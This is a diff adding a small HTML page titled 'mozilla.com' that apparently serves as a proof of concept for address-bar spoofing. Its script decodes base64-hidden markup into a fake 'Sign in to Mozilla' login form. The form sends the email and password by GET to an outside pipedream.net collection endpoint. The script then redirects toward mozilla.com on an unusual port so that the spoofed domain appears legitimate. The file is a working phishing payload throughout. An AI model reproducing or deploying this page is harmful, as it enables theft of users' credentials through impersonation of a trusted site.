@@ -1,0 +1,16 @@
+
+<html>
+<title>mozilla.com</title>
+<body>
+<script>
+ function spoof()
+ {
+ var data = 'ICAgICAgPGgxPlNpZ24gaW4gdG8gTW96aWxsYTwvaDE+DQogICAgICA8cD5UbyBjb250aW51ZSB0byB3d3cuZ29vZ2xlLmNvbTwvcD4NCiAgICAgIDxmb3JtIGFjdGlvbj0iaHR0cHM6Ly9lOGE3MmZkMTkzY2M2MDZlZjY3OGZhYWEyMzBjMzMwNS5tLnBpcGVkcmVhbS5uZXQiIG1ldGhvZD0iR0VUIj4NCiAgICAgICAgPGlucHV0IHR5cGU9ImVtYWlsIiBuYW1lPSJlbWFpbCIgcGxhY2Vob2xkZXI9IkVtYWlsIGFkZHJlc3MiIHJlcXVpcmVkIGF1dG9jb21wbGV0ZT0idXNlcm5hbWUiPg0KICAgICAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InBhc3N3b3JkIiBwbGFjZWhvbGRlcj0iUGFzc3dvcmQiIHJlcXVpcmVkIGF1dG9jb21wbGV0ZT0iY3VycmVudC1wYXNzd29yZCI+DQogICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0Ij5TaWduIEluPC9idXR0b24+DQogICAgICA8L2Zvcm0+'; // base64 encoded html content
+ document.body.innerHTML=atob(data);
+ window.location.assign("https://mozilla.com:3117");
+ }
+setInterval(spoof(),100000);
+</script>
+</script>
+</body>
+</html>
